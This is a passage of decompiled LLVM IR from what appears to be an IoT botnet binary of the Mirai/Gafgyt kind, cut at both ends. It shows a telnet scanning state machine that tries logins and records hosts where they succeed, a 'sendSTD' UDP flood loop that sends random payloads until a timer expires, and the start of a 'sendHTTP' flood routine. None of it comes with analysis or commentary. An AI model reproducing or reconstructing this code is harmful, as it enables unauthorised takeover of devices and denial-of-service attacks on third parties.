  %v3_bdd4 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c578

dec_label_pc_bddc:                                ; preds = %dec_label_pc_bd10
  %v2_bdf4 = load i32, i32* %v1_bd28, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_be08 = call i32 @__libc_send(i32 %v2_bdf4, i32 ptrtoint ([3 x i8]* @global_var_1cc24.370 to i32), i32 2, i32 16384)
  %v1_be10 = icmp slt i32 %v5_be08, 0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  br i1 %v1_be10, label %dec_label_pc_be18, label %dec_label_pc_be3c

dec_label_pc_be18:                                ; preds = %dec_label_pc_bddc
  %v3_be34 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c578

dec_label_pc_be3c:                                ; preds = %dec_label_pc_bddc
  %v3_be5c = call i32 @advance_state(i32* nonnull %v1_bd28, i32 4)
  br label %dec_label_pc_c578

dec_label_pc_be64:                                ; preds = %dec_label_pc_b4e4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_be7c = inttoptr i32 %v2_b498 to i32*
  %v2_be7c = load i32, i32* %v1_be7c, align 4
  store i32 %v2_be7c, i32* %ip.global-to-local, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_be9c = add i32 %v2_b494, %v2_bbf8
  %v1_bea0 = inttoptr i32 %v2_be9c to i32*
  %v2_bea0 = load i32, i32* %v1_bea0, align 4
  store i32 %v2_bea0, i32* %r2.global-to-local, align 4
  %v1_bea8 = load i32, i32* @sp, align 4
  %v2_bea8 = inttoptr i32 %v1_bea8 to i32*
  store i32 ptrtoint (i32* @global_var_26fd8 to i32), i32* %v2_bea8, align 4
  %v0_beac = load i32, i32* %ip.global-to-local, align 4
  %v4_beb8 = inttoptr i32 %v2_bea0 to i8*
  %v5_beb8 = call i32 @read_until_response(i32 %v0_beac, i32 %arg1, i8* %v4_beb8, i32 1024)
  %v2_bec0 = icmp eq i32 %v5_beb8, 0
  br i1 %v2_bec0, label %dec_label_pc_bf50, label %dec_label_pc_bec8

dec_label_pc_bec8:                                ; preds = %dec_label_pc_be64
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_bee4 = add i32 %v2_b498, 24
  %v1_bee8 = inttoptr i32 %v2_bee4 to i32*
  %v2_bee8 = load i32, i32* %v1_bee8, align 4
  %v1_bef0 = call i32 @contains_fail(i32 %v2_bee8)
  %v2_bef8 = icmp eq i32 %v1_bef0, 0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  br i1 %v2_bef8, label %dec_label_pc_bf28, label %dec_label_pc_bf00

dec_label_pc_bf00:                                ; preds = %dec_label_pc_bec8
  %v3_bf20 = call i32 @advance_state(i32* %v1_be7c, i32 0)
  br label %dec_label_pc_c578

dec_label_pc_bf28:                                ; preds = %dec_label_pc_bec8
  %v3_bf48 = call i32 @advance_state(i32* %v1_be7c, i32 5)
  br label %dec_label_pc_c578

dec_label_pc_bf50:                                ; preds = %dec_label_pc_be64
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_bf70 = load i32, i32* %v1_b4a0, align 4
  %v1_bf74 = add i32 %v2_bf70, 3
  store i32 %v1_bf74, i32* @r4, align 4
  %v2_bf7c = call i32 @__GI_time(i32* null)
  %v0_bf84 = load i32, i32* @r4, align 4
  %v3_bf84 = icmp ult i32 %v0_bf84, %v2_bf7c
  br i1 %v3_bf84, label %dec_label_pc_bf8c, label %dec_label_pc_c578

dec_label_pc_bf8c:                                ; preds = %dec_label_pc_bf50
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_bfa8 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c578

dec_label_pc_bfb0:                                ; preds = %dec_label_pc_b4e4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_bfc8 = inttoptr i32 %v2_b498 to i32*
  %v2_bfc8 = load i32, i32* %v1_bfc8, align 4
  store i32 %v2_bfc8, i32* @r4, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_bfec = add i32 %v2_b498, 11
  %v2_bfec = inttoptr i32 %v1_bfec to i8*
  %v3_bfec = load i8, i8* %v2_bfec, align 1
  %v4_bfec = zext i8 %v3_bfec to i32
  store i32 %v4_bfec, i32* %r2.global-to-local, align 4
  %v4_bff8 = mul nuw nsw i32 %v4_bfec, 4
  %v5_bff8 = add i32 %v4_bff8, ptrtoint ([334 x i8*]* @global_var_26a70.372 to i32)
  %v6_bff8 = inttoptr i32 %v5_bff8 to i32*
  %v7_bff8 = load i32, i32* %v6_bff8, align 4
  store i32 %v7_bff8, i32* @r5, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c01c = load i8, i8* %v2_bfec, align 1
  %v4_c01c = zext i8 %v3_c01c to i32
  store i32 %v4_c01c, i32* %r2.global-to-local, align 4
  %v4_c028 = mul nuw nsw i32 %v4_c01c, 4
  %v5_c028 = add i32 %v4_c028, ptrtoint ([334 x i8*]* @global_var_26a70.372 to i32)
  %v6_c028 = inttoptr i32 %v5_c028 to i32*
  %v7_c028 = load i32, i32* %v6_c028, align 4
  %v1_c02c = inttoptr i32 %v7_c028 to i8*
  %v3_c030 = call i32 @strlen(i8* %v1_c02c)
  %v0_c038 = load i32, i32* @r4, align 4
  %v0_c03c = load i32, i32* @r5, align 4
  store i32 %v3_c030, i32* %r2.global-to-local, align 4
  %v4_c048 = call i32 @__libc_send(i32 %v0_c038, i32 %v0_c03c, i32 %v3_c030, i32 16384)
  %v1_c050 = icmp slt i32 %v4_c048, 0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  br i1 %v1_c050, label %dec_label_pc_c058, label %dec_label_pc_c07c

dec_label_pc_c058:                                ; preds = %dec_label_pc_bfb0
  %v3_c074 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c578

dec_label_pc_c07c:                                ; preds = %dec_label_pc_bfb0
  %v2_c094 = load i32, i32* %v1_bfc8, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_c0a8 = call i32 @__libc_send(i32 %v2_c094, i32 ptrtoint ([3 x i8]* @global_var_1cc24.370 to i32), i32 2, i32 16384)
  %v1_c0b0 = icmp slt i32 %v5_c0a8, 0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  br i1 %v1_c0b0, label %dec_label_pc_c0b8, label %dec_label_pc_c0dc

dec_label_pc_c0b8:                                ; preds = %dec_label_pc_c07c
  %v3_c0d4 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c578

dec_label_pc_c0dc:                                ; preds = %dec_label_pc_c07c
  %v3_c0fc = call i32 @advance_state(i32* nonnull %v1_bfc8, i32 6)
  br label %dec_label_pc_c578

dec_label_pc_c104:                                ; preds = %dec_label_pc_b4e4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_c11c = inttoptr i32 %v2_b498 to i32*
  %v2_c11c = load i32, i32* %v1_c11c, align 4
  store i32 %v2_c11c, i32* %ip.global-to-local, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_c13c = add i32 %v2_b494, %v2_bbf8
  %v1_c140 = inttoptr i32 %v2_c13c to i32*
  %v2_c140 = load i32, i32* %v1_c140, align 4
  store i32 %v2_c140, i32* %r2.global-to-local, align 4
  %v1_c148 = load i32, i32* @sp, align 4
  %v2_c148 = inttoptr i32 %v1_c148 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_2701c.374 to i32), i32* %v2_c148, align 4
  %v0_c14c = load i32, i32* %ip.global-to-local, align 4
  %v4_c158 = inttoptr i32 %v2_c140 to i8*
  %v5_c158 = call i32 @read_until_response(i32 %v0_c14c, i32 %arg1, i8* %v4_c158, i32 1024)
  %v2_c160 = icmp eq i32 %v5_c158, 0
  br i1 %v2_c160, label %dec_label_pc_c37c, label %dec_label_pc_c168

dec_label_pc_c168:                                ; preds = %dec_label_pc_c104
  store i32 %storemerge548, i32* @r4, align 4
  %v2_c170 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c184 = load i32, i32* @r4, align 4
  %v2_c190 = mul i32 %v0_c184, 28
  %v2_c198 = add i32 %v2_bb7c, %v2_c190
  %v2_c19c = inttoptr i32 %v2_c198 to i32*
  store i32 %v2_c170, i32* %v2_c19c, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_c1c0 = load i32, i32* %v1_c140, align 4
  %v1_c1c8 = call i32 @contains_fail(i32 %v2_c1c0)
  %v2_c1d0 = icmp eq i32 %v1_c1c8, 0
  br i1 %v2_c1d0, label %dec_label_pc_c200, label %dec_label_pc_c1d8

dec_label_pc_c1d8:                                ; preds = %dec_label_pc_c168
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c1f8 = call i32 @advance_state(i32* %v1_c11c, i32 0)
  br label %dec_label_pc_c578

dec_label_pc_c200:                                ; preds = %dec_label_pc_c168
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_c220 = load i32, i32* %v1_c140, align 4
  %v1_c228 = call i32 @contains_success(i32 %v2_c220)
  %v2_c230 = icmp eq i32 %v1_c228, 0
  br i1 %v2_c230, label %dec_label_pc_c358, label %dec_label_pc_c238

dec_label_pc_c238:                                ; preds = %dec_label_pc_c200
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_c258 = add i32 %v2_b498, 9
  %v2_c258 = inttoptr i32 %v1_c258 to i8*
  %v3_c258 = load i8, i8* %v2_c258, align 1
  %v7_c25c = icmp eq i8 %v3_c258, 2
  br i1 %v7_c25c, label %dec_label_pc_c264, label %dec_label_pc_c28c

dec_label_pc_c264:                                ; preds = %dec_label_pc_c238
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c284 = call i32 @advance_state(i32* %v1_c11c, i32 7)
  br label %dec_label_pc_c578

dec_label_pc_c28c:                                ; preds = %dec_label_pc_c238
  %v2_c290 = load i32, i32* @global_var_272d0.45, align 4
  store i32 %v2_c290, i32* @r4, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c2b0 = call i32 @get_telstate_host(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  store i32 %v3_c2b0, i32* %ip.global-to-local, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_c2d8 = add i32 %v2_b498, 10
  %v2_c2d8 = inttoptr i32 %v1_c2d8 to i8*
  %v3_c2d8 = load i8, i8* %v2_c2d8, align 2
  %v4_c2d8 = zext i8 %v3_c2d8 to i32
  store i32 %v4_c2d8, i32* %r2.global-to-local, align 4
  %v4_c2e4 = mul nuw nsw i32 %v4_c2d8, 4
  %v5_c2e4 = add i32 %v4_c2e4, ptrtoint ([343 x i8*]* @global_var_26a4c.368 to i32)
  %v6_c2e4 = inttoptr i32 %v5_c2e4 to i32*
  %v7_c2e4 = load i32, i32* %v6_c2e4, align 4
  store i32 %v7_c2e4, i32* @lr, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_c308 = add i32 %v2_b498, 11
  %v2_c308 = inttoptr i32 %v1_c308 to i8*
  %v3_c308 = load i8, i8* %v2_c308, align 1
  %v4_c308 = zext i8 %v3_c308 to i32
  store i32 %v4_c308, i32* %r2.global-to-local, align 4
  %v4_c314 = mul nuw nsw i32 %v4_c308, 4
  %v5_c314 = add i32 %v4_c314, ptrtoint ([334 x i8*]* @global_var_26a70.372 to i32)
  %v6_c314 = inttoptr i32 %v5_c314 to i32*
  %v7_c314 = load i32, i32* %v6_c314, align 4
  %v1_c318 = load i32, i32* @sp, align 4
  %v2_c318 = inttoptr i32 %v1_c318 to i32*
  store i32 %v7_c314, i32* %v2_c318, align 4
  %v0_c31c = load i32, i32* @r4, align 4
  %v0_c324 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_c324, i32* @r2, align 4
  %v2_c32c = call i32 @Rootsprintf(i32 %v0_c31c, i32 ptrtoint (i32* @global_var_1cc28.377 to i32))
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c350 = call i32 @advance_state(i32* %v1_c11c, i32 7)
  br label %dec_label_pc_c578

dec_label_pc_c358:                                ; preds = %dec_label_pc_c200
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c374 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c578

dec_label_pc_c37c:                                ; preds = %dec_label_pc_c104
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_c398 = add i32 %v2_b494, %v2_bb7c
  %v1_c39c = inttoptr i32 %v2_c398 to i32*
  %v2_c39c = load i32, i32* %v1_c39c, align 4
  %v1_c3a0 = add i32 %v2_c39c, 7
  store i32 %v1_c3a0, i32* @r4, align 4
  %v2_c3a8 = call i32 @__GI_time(i32* null)
  %v0_c3b0 = load i32, i32* @r4, align 4
  %v3_c3b0 = icmp ult i32 %v0_c3b0, %v2_c3a8
  br i1 %v3_c3b0, label %dec_label_pc_c3b8, label %dec_label_pc_c578

dec_label_pc_c3b8:                                ; preds = %dec_label_pc_c37c
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c3d4 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c578

dec_label_pc_c408:                                ; preds = %dec_label_pc_b4e4
  store i32 %storemerge548, i32* @r4, align 4
  %v2_c410 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c424 = load i32, i32* @r4, align 4
  %v2_c430 = mul i32 %v0_c424, 28
  %v2_c438 = add i32 %v2_bb7c, %v2_c430
  %v2_c43c = inttoptr i32 %v2_c438 to i32*
  store i32 %v2_c410, i32* %v2_c43c, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_c458 = inttoptr i32 %v2_b498 to i32*
  %v2_c458 = load i32, i32* %v1_c458, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_c46c = call i32 @__libc_send(i32 %v2_c458, i32 ptrtoint ([5 x i8]* @global_var_1cc88.379 to i32), i32 4, i32 16384)
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_c488 = load i32, i32* %v1_c458, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_c49c = call i32 @__libc_send(i32 %v2_c488, i32 ptrtoint ([8 x i8]* @global_var_1cc90.381 to i32), i32 7, i32 16384)
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_c4b8 = load i32, i32* %v1_c458, align 4
  store i32 %v2_c4b8, i32* @r4, align 4
  %v2_c4c0 = load i32, i32* bitcast ([443 x i8]** @global_var_26a48.384 to i32*), align 4
  store i32 %v2_c4c0, i32* @r5, align 4
  %v1_c4cc = inttoptr i32 %v2_c4c0 to i8*
  %v3_c4d0 = call i32 @strlen(i8* %v1_c4cc)
  %v0_c4d8 = load i32, i32* @r4, align 4
  %v0_c4dc = load i32, i32* @r5, align 4
  store i32 %v3_c4d0, i32* %r2.global-to-local, align 4
  %v5_c4e8 = call i32 @__libc_send(i32 %v0_c4d8, i32 %v0_c4dc, i32 %v3_c4d0, i32 16384)
  %v1_c4f0 = icmp slt i32 %v5_c4e8, 0
  br i1 %v1_c4f0, label %dec_label_pc_c4f8, label %dec_label_pc_c51c

dec_label_pc_c4f8:                                ; preds = %dec_label_pc_c408
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c514 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c578

dec_label_pc_c51c:                                ; preds = %dec_label_pc_c408
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_c538 = add i32 %v2_b494, %v2_bb7c
  %v1_c53c = inttoptr i32 %v2_c538 to i32*
  %v2_c53c = load i32, i32* %v1_c53c, align 4
  %v1_c540 = add i32 %v2_c53c, 25
  store i32 %v1_c540, i32* @r4, align 4
  %v2_c548 = call i32 @__GI_time(i32* null)
  %v0_c550 = load i32, i32* @r4, align 4
  %v3_c550 = icmp ult i32 %v0_c550, %v2_c548
  br i1 %v3_c550, label %dec_label_pc_c558, label %dec_label_pc_c578

dec_label_pc_c558:                                ; preds = %dec_label_pc_c51c
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c574 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c578

dec_label_pc_c578:                                ; preds = %dec_label_pc_bb64, %dec_label_pc_bcb0, %dec_label_pc_bf50, %dec_label_pc_c37c, %dec_label_pc_c51c, %dec_label_pc_b4e4, %dec_label_pc_b740, %dec_label_pc_c4f8, %dec_label_pc_c3b8, %dec_label_pc_c358, %dec_label_pc_c28c, %dec_label_pc_c264, %dec_label_pc_c1d8, %dec_label_pc_c0dc, %dec_label_pc_c0b8, %dec_label_pc_c058, %dec_label_pc_bf8c, %dec_label_pc_bf28, %dec_label_pc_bf00, %dec_label_pc_be3c, %dec_label_pc_be18, %dec_label_pc_bdb8, %dec_label_pc_bcec, %dec_label_pc_bc88, %dec_label_pc_bc60, %dec_label_pc_bba0, %dec_label_pc_bb40, %dec_label_pc_baac, %dec_label_pc_ba88, %dec_label_pc_b8dc, %dec_label_pc_b8b8, %dec_label_pc_b714, %dec_label_pc_c558
  %v1_c57c = add nuw nsw i32 %storemerge548, 1
  store i32 %v1_c57c, i32* %r2.global-to-local, align 4
  %v5_c590 = icmp slt i32 %v1_c57c, %arg2
  br i1 %v5_c590, label %dec_label_pc_b480, label %dec_label_pc_b474

; uselistorder directives
  uselistorder i32 %v1_c57c, { 2, 1, 0 }
  uselistorder i32 %v3_c4d0, { 1, 0 }
  uselistorder i32* %v1_c11c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_c030, { 1, 0 }
  uselistorder i32 %v3_bd90, { 1, 0 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v0_b5ec, { 1, 0 }
  uselistorder i32 %v2_b580, { 1, 0 }
  uselistorder i32 %v2_b57c, { 1, 0, 2 }
  uselistorder i8* %v2_b554, { 1, 0, 2 }
  uselistorder i32 %v0_b4c8, { 1, 0 }
  uselistorder i32* %v1_b4a0, { 1, 0, 2 }
  uselistorder i32 %v2_b498, { 35, 34, 36, 27, 28, 29, 30, 31, 32, 33, 24, 23, 25, 26, 21, 4, 22, 18, 17, 19, 20, 15, 3, 16, 13, 12, 11, 14, 6, 7, 1, 2, 8, 0, 10, 9, 5 }
  uselistorder i32 %v2_b494, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v3_b48c, { 80, 81, 79, 77, 78, 76, 75, 74, 60, 61, 59, 64, 65, 72, 71, 70, 68, 69, 67, 66, 63, 73, 62, 58, 57, 55, 56, 53, 54, 52, 51, 50, 46, 47, 45, 49, 48, 44, 43, 41, 42, 39, 40, 38, 37, 36, 32, 33, 31, 35, 34, 30, 29, 27, 28, 26, 24, 25, 22, 21, 23, 20, 19, 18, 17, 16, 11, 9, 10, 8, 7, 6, 5, 4, 15, 14, 13, 12, 3, 2, 1, 0 }
  uselistorder i32 %storemerge548, { 1, 4, 5, 7, 6, 3, 2, 0 }
  uselistorder i32 %v2_bb7c, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 %v2_b904, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v1_b458, { 1, 2, 0 }
  uselistorder i32 %v1_b434, { 2, 1, 0 }
  uselistorder i32 %storemerge457, { 1, 0 }
  uselistorder i32 %v3_b374, { 4, 3, 5, 6, 7, 9, 8, 10, 12, 11, 13, 16, 15, 14, 18, 0, 19, 17, 1, 22, 23, 24, 21, 2, 20 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 0, 2, 1 }
  uselistorder i32* %stack_var_-340, { 1, 0, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 50, 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 42, 43, 44, 45, 46, 47, 48, 49, 106, 51, 52, 107, 53 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 8, 9, 10 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 ptrtoint ([334 x i8*]* @global_var_26a70.372 to i32), { 2, 0, 1 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1cc24.370 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([343 x i8*]* @global_var_26a4c.368 to i32), { 2, 0, 1 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 3, 0, 1, 4 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c578, { 32, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 5 }
  uselistorder label %dec_label_pc_b918, { 1, 0 }
  uselistorder label %dec_label_pc_b8dc, { 1, 0 }
  uselistorder label %dec_label_pc_b4e4, { 1, 0 }
  uselistorder label %dec_label_pc_b480, { 1, 0 }
  uselistorder label %dec_label_pc_b474, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b3b8, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_c59c = load i32, i32* @fp, align 4
  store i32 %v3_c59c, i32* %stack_var_-16, align 4
  store i32 50596, i32* %stack_var_-4, align 4
  %v13_c59c = ptrtoint i32* %stack_var_-16 to i32
  %v2_c5a0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c5a0, i32* @fp, align 4
  %v3_c5c0 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_c5d0 = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* @r0, align 4
  %v1_c5e4 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_c5f0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_c5f0, i32* @r0, align 4
  %v2_c5fc = call i32 @bzero(i32 %v2_c5f0, i32 16)
  %v1_c604 = add i32 %v1_c5e4, 16
  %v2_c604 = inttoptr i32 %v1_c604 to i32*
  %v3_c604 = load i32, i32* %v2_c604, align 4
  %v1_c608 = inttoptr i32 %v3_c604 to i32*
  %v2_c608 = load i32, i32* %v1_c608, align 4
  %v1_c610 = add i32 %v1_c5e4, 12
  %v2_c610 = inttoptr i32 %v1_c610 to i32*
  %v3_c610 = load i32, i32* %v2_c610, align 4
  store i32 %v3_c610, i32* @r2, align 4
  %v2_c61c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_c61c, i32* @r3, align 4
  %v5_c628 = call i32 @bcopy(i32 %v2_c608, i32 %v2_c61c, i32 %v3_c610, i32 %v2_c61c, i32 ptrtoint (i32* @0 to i32))
  %v1_c630 = add i32 %v1_c5e4, 8
  %v2_c630 = inttoptr i32 %v1_c630 to i32*
  %v3_c630 = load i32, i32* %v2_c630, align 4
  %v3_c638 = urem i32 %v3_c630, 65536
  store i32 %v3_c638, i32* %stack_var_-52, align 4
  %v2_c65c = ptrtoint i32* %stack_var_-196 to i32
  %v2_c710 = add i32 %v2_c5d0, %arg3
  %v2_c6b8 = add i32 %v13_c59c, -180
  br label %dec_label_pc_c658

dec_label_pc_c658:                                ; preds = %dec_label_pc_c734, %entry
  %storemerge7 = phi i32 [ 0, %entry ], [ %v1_c738, %dec_label_pc_c734 ]
  store i32 ptrtoint ([36 x i8*]* @global_var_1ce3c.422 to i32), i32* @r3, align 4
  store i32 144, i32* @ip, align 4
  store i32 %v2_c65c, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_1ce3c.422 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_c670 = call i32 @memcpy()
  %v0_c674 = call i32 @rand()
  %v1_c684 = zext i32 %v0_c674 to i64
  %v4_c684 = mul nuw nsw i64 %v1_c684, 954437177
  %v3_c6881 = udiv i64 %v4_c684, 34359738368
  %tmp = icmp ult i32 %storemerge7, 50
  br i1 %tmp, label %dec_label_pc_c734, label %dec_label_pc_c6d4

dec_label_pc_c6d4:                                ; preds = %dec_label_pc_c658
  %v3_c6943 = mul nuw nsw i64 %v3_c6881, 4
  %v3_c694 = trunc i64 %v3_c6943 to i32
  %v2_c69c.neg = sub i32 %v0_c674, %v3_c694
  %v3_c6985 = mul nuw nsw i64 %v3_c6881, 32
  %v3_c698 = trunc i64 %v3_c6985 to i32
  %v2_c6a0 = sub i32 %v2_c69c.neg, %v3_c698
  %v3_c6b0 = mul i32 %v2_c6a0, 4
  %v2_c6bc = add i32 %v2_c6b8, %v3_c6b0
  %v1_c6c0 = inttoptr i32 %v2_c6bc to i32*
  %v2_c6c0 = load i32, i32* %v1_c6c0, align 4
  %v5_c6e4 = call i32 @__libc_send(i32 %v3_c5c0, i32 %v2_c6c0, i32 65, i32 0)
  %v3_c6f8 = call i32 @__libc_connect(i32 %v3_c5c0, i32 %v2_c5f0, i32 16)
  %v2_c700 = call i32 @__GI_time(i32* null)
  %v5_c718 = icmp slt i32 %v2_c700, %v2_c710
  br i1 %v5_c718, label %dec_label_pc_c72c, label %dec_label_pc_c71c

dec_label_pc_c71c:                                ; preds = %dec_label_pc_c6d4
  %v1_c720 = call i32 @__GI_close(i32 %v3_c5c0)
  %v1_c728 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_c72c

dec_label_pc_c72c:                                ; preds = %dec_label_pc_c6d4, %dec_label_pc_c71c
  br label %dec_label_pc_c734

dec_label_pc_c734:                                ; preds = %dec_label_pc_c658, %dec_label_pc_c72c
  %stack_var_-24.0 = phi i32 [ %storemerge7, %dec_label_pc_c658 ], [ 0, %dec_label_pc_c72c ]
  %v1_c738 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_c658

; uselistorder directives
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v2_c5f0, { 0, 2, 1 }
  uselistorder i32 %v1_c5e4, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_c734, { 1, 0 }
  uselistorder label %dec_label_pc_c72c, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_c750 = load i32, i32* @fp, align 4
  store i32 %v3_c750, i32* %stack_var_-16, align 4
  store i32 51032, i32* %stack_var_-4, align 4
  %v13_c750 = ptrtoint i32* %stack_var_-16 to i32
  %v2_c754 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c754, i32* @fp, align 4
  %v2_c77c = call i32 @__GI_time(i32* null)
  %v3_c784 = load i32, i32* %stack_var_0, align 4
  %v2_c788 = add i32 %v3_c784, %v2_c77c
  %v2_c7e8 = ptrtoint i32* %stack_var_-544 to i32
  %tmp23 = bitcast i32* %stack_var_-544 to i8*
  %v5_c8c831 = icmp sgt i32 %arg6, 0
  br i1 %v5_c8c831, label %dec_label_pc_c7a4, label %dec_label_pc_c8cc

dec_label_pc_c7a4:                                ; preds = %entry, %dec_label_pc_c8b0
  %storemerge132 = phi i32 [ %v1_c8b4, %dec_label_pc_c8b0 ], [ 0, %entry ]
  %v0_c7a4 = call i32 @rand()
  %v2_c7bc = srem i32 %v0_c7a4, 36
  %v4_c7e4 = mul nsw i32 %v2_c7bc, 4
  %v5_c7e4 = add i32 %v4_c7e4, ptrtoint ([37 x i8*]* @global_var_269b4.463 to i32)
  %v6_c7e4 = inttoptr i32 %v5_c7e4 to i32*
  %v7_c7e4 = load i32, i32* %v6_c7e4, align 4
